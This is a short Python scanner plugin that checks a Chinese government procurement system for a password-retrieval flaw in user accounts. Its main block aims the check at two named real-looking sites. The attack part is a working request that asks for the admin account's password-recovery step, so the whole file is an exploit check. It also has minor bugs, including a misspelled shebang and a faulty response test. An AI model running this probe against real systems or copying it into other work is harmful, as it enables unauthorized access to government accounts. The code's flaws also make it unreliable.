#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:政府采购系统通用型任意用户密码获取漏洞
#Refer:http://www.wooyun.org/bugs/wooyun-2014-076710

def assign(service,arg):
    if service=="zfcgxt":
        return True,arg 
    


def  audit(arg):
    url=arg+"UserSecurityController.do?method=getPassword&step=2&userName=admin"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and "usrIsExpired" and "usrIsLocked" in res:
        security_hole(url)

if __name__=="__main__":
    from dummy import *
    audit(assign('zfcgxt','http://www.sxzfcg.gov.cn/')[1])
    audit(assign('zfcgxt','http://www.tlzbcg.com/')[1])